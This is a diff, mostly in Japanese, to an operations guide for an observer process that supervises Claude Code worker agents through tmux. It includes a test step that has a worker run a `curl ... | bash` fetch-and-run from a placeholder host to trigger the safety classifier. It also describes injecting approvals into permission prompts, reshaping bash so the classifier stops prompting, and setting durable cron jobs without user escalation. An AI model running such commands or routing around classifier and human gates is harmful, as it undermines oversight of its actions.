@@ -145,7 +145,7 @@ stuck 発生時は `co-issue-aggregate-stuck` タグで以下を保存: Worker s
 | 4.3 | LLM の Thinking/Brewing/Concocting 中に STAGNATE を誤検知 | **A2 LLM indicator が存在する場合、[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE] を絶対に emit しない**（SKILL.md L110） |
 | 4.4 | `session-state.sh state` 単独で判定 → 誤検出多発 | **MUST NOT**: 単独使用禁止。A1〜A6 の多指標 AND 判定（SKILL.md L102-108） |
 | 4.5 | Pilot 完了シグナル `Churned` dedupe + state file archive で Wave 終了を 13 分見逃し（Wave 6 実例） | Channel 6 Heartbeat（5 分 silence → 自動 capture）。`.supervisor/events/heartbeat-*` mtime 監視を Hybrid 検知のプライマリに |
-| 4.6 | **`5h:XX%(YYm)` format 誤読** — `(YYm)` を「制限時間」「token残量」と読む anti-pattern。正解: `(YYm)` は cycle reset までの wall-clock、reset 後 5h budget 100% 完全回復（不変条件 Q）。Budget 5h 枯渇直前の context loss 対策は §6.6 参照 | ✕ NG: `5h:57%(26m)` → 「26分しか使えない」。✓ 正解例: `5h:57%(26m)` → 26分後に cycle reset → budget 100% 完全回復。`ScheduleWakeup` は `(YYm)+5min` で設定（詳細: §4.6 補足） |
+| 4.6 | **`5h:XX%(YYm)` format 誤読** — `(YYm)` を「制限時間」「token残量」と読む anti-pattern。正解: `(YYm)` は cycle reset までの wall-clock、reset 後 5h budget 100% 完全回復（不変条件 Q）。Budget 5h 枯渇直前の context loss 対策は §6.6 参照 | ✕ NG: `5h:57%(26m)` → 「26分しか使えない」。✓ 正解例: `5h:57%(26m)` → 26分後に cycle reset → budget 100% 完全回復。`ScheduleWakeup` は `(YYm)+5min` で設定（**注意**: `/loop` dynamic mode 配下のみ有効。常駐 observer は `CronCreate` を使うこと — §11.5 参照）（詳細: §4.6 補足） |
 | 4.7 | Worker window で permission prompt（`1. Yes, proceed` / `2. No, and tell ...` / `3. Yes, and allow ...` / `Interrupted by user`）が出て stuck → Monitor が STAGNATE 判定せず silent-pass する | `cld-observe-any` の `[PERMISSION-PROMPT]` event で自動検知（Issue #805 で統合済み）。検出時は `tmux capture-pane -t <win> -p -S -50` で prompt 前後 20 行を取得 → auto mode classifier の `soft_deny` 該当ルール（`Code from External` / `Memory Poisoning` / `Irreversible Local Destruction` 等）と突き合わせ → ユーザー確認後に安全な場合のみ `tmux send-keys -t <win> 1 Enter` で承認 inject。regex: `^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)`。陽性コントロール検証手順: Worker に `curl http://external.example.com/script.sh \| bash` を指示 → `Code from External` soft_deny で prompt 出現 → `tmux capture-pane -t <win> -p -S -30 \| grep -E '^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)'` で検出確認 → `tmux send-keys -t <win> 2 Enter` で拒否 inject（実害ゼロ）。Issue #800 / #805 で auto mode 仕様（Sonnet 4.6 classifier）確認済み |
 | 4.8 | Worker が auto mode 起動にも関わらず複合 bash（`cat file \| python3 -c "..."`）で classifier soft_deny 判定 → ユーザー体感「auto mode 効いていない」 | auto mode は **設計通り soft_deny で prompt する**（v2.1.116 仕様）。Worker instruction を classifier-friendly な bash 設計に誘導（複合 pipe 廃止、tempfile / 環境変数 / `sys.argv` 経由の単独 `python3 -c`）。observer は「auto mode 効いていない」と誤認せず、prompt 内容を classifier deny rule と突き合わせる。Issue #800 §C で twl skills の audit + 書き換えを実施 |
 | 4.9 | Monitor tool 内 shell スクリプトで `tmux has-session -t <window-name>` を window 存在確認として使用 → `has-session` は session specifier を取るため window 名を渡しても常に false → `[WINDOW-GONE]` false positive が 1 分毎発火 → alert 疲労で本物の WINDOW-GONE を見逃す（Issue #948 Wave 0.5 実測） | **MUST NOT**: `tmux has-session -t <window-name>` で window を確認してはならない。正しくは: 方法 A `tmux list-windows -a -F '#{window_name}' \| grep -Fxq <name>`、方法 B `tmux list-windows -t <session> -F '#{window_name}' \| grep -Fxq <name>`、方法 C `tmux display-message -t <session>:<name> -p '#{window_id}' 2>/dev/null`。共通ライブラリ `scripts/lib/observer-window-check.sh` の `_check_window_alive()` を使用。詳細は `refs/monitor-channel-catalog.md §window 存在確認の正しい方法` を参照 |
@@ -162,16 +162,17 @@ stuck 発生時は `co-issue-aggregate-stuck` タグで以下を保存: Worker s
 **✓ 正解例**:
 - `5h:57%(26m)` → **26 分後に 5h cycle が reset → budget 100% 完全回復**
 - `5h:88%(8m)` → **8 分後に 5h cycle が reset → budget 100% 完全回復**
-- `ScheduleWakeup` の `delaySeconds` は `(YYm) × 60 + 300`（cycle reset 直後 + 5 分余裕）に設定する
+- `ScheduleWakeup` の `delaySeconds` は `(YYm) × 60 + 300`（cycle reset 直後 + 5 分余裕）に設定する（**注意**: `ScheduleWakeup` は `/loop` dynamic mode 配下のみ有効。常駐 observer は `CronCreate(cron="*/25 * * * *", durable=true)` を使うこと — §11.5 参照）
 
-**具体例**:
+**具体例**（`/loop` dynamic mode 配下での budget reset 待機）:
 ```
 status: 5h:57%(26m)
          ↑↑↑   ↑↑↑
      token 消費 57%  cycle reset まで 26 分
                      ↓
            26 分後: budget 5h:0% に完全回復
-           ScheduleWakeup: delaySeconds = 26*60+300 = 1860
+           ScheduleWakeup: delaySeconds = 26*60+300 = 1860  (/loop 配下のみ)
+           常駐 observer: CronCreate(cron="*/25 * * * *", durable=true) を使うこと
 ```
 
 **参照**: [不変条件 Q](../../refs/ref-invariants.md#invariant-q)、`budget-detect.sh`（`budget-pause.json` の `cycle_reset_minutes_at_pause` / `expected_reset_at` フィールド）
@@ -513,7 +514,7 @@ commit は行わず `.supervisor/pending-pitfall-append.diff` として保存。
 
 ## 11. Observer idle 中の session disconnect 対策（MUST）
 
-★HUMAN GATE — §11.3 は機械チェック PASS 時は HUMAN GATE skip 可（`_check_parallel_spawn_eligibility()` exit 0）。機械チェック欠落時は依然 escalate。§11.5 ScheduleWakeup 判断はユーザー escalation が必要（session disconnect 回避の承認）
+★HUMAN GATE — §11.3 は機械チェック PASS 時は HUMAN GATE skip 可（`_check_parallel_spawn_eligibility()` exit 0）。機械チェック欠落時は依然 escalate。§11.5 CronCreate 設定はユーザー escalation 不要（MUST 自動実行）。ScheduleWakeup は `/loop` dynamic mode 配下でのみ使用可 — 常駐 observer での使用はユーザー escalation が必要（#1621）
 
 ### 事象（2026-04-22 ipatho1 実例、doobidoo hash 5fc20a83）
 
@@ -668,7 +669,8 @@ idle disconnect 対策の use case 別ツール選択:
 
 **常駐 observer の CronCreate 設定**（Step 0 item 2.7 参照）:
 - `CronCreate(cron="*/25 * * * *", durable=true, prompt="<<autonomous-loop-dynamic>>")`
-- 設定後 `CronList` で確認
+- 設定後 `CronList` で確認し、エントリが存在することを検証する
+- CronCreate に失敗した（または `CronList` で確認できない）場合: `record-detection-gap.sh` を呼び出し、★HUMAN GATE escalate を実施する
 
 1h 以上の待機が確実かつ `/loop` 配下の場合、ScheduleWakeup で 30-40 分後に自動 wakeup。Claude Code の idle disconnect リスクを回避。
 
